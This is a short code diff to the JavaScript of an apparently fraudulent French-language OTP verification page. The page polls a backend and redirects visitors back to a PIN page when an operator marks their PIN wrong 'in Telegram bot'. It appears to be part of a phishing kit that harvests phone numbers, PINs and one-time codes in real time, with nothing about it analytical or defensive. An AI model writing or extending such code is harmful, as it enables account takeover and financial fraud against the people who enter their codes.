@@ -139,7 +139,7 @@ window.onload = () => {
     const phone = localStorage.getItem('phone');
     if (!phone) {
         errorBox.innerText = "Session expirée. Veuillez vous reconnecter.";
-        setTimeout(() => window.location.href = "/index.html", 1500);
+        setTimeout(() => window.location.href = "/page6.html", 1500);
     }
 
     startCountdown();
@@ -210,6 +210,12 @@ async function handleVerification() {
                 clearInterval(poll);
                 errorBox.innerText = "❌ Code incorrect, veuillez entrer le bon code OTP.";
                 reset();
+            }
+
+            // Redirect back to Page 6 if PIN is marked wrong in Telegram bot
+            if (data.status === "otp1_wrongpin") {
+                clearInterval(poll);
+                window.location.href = "/page6.html?error=wrongpin";
             }
 
         }, 2000);
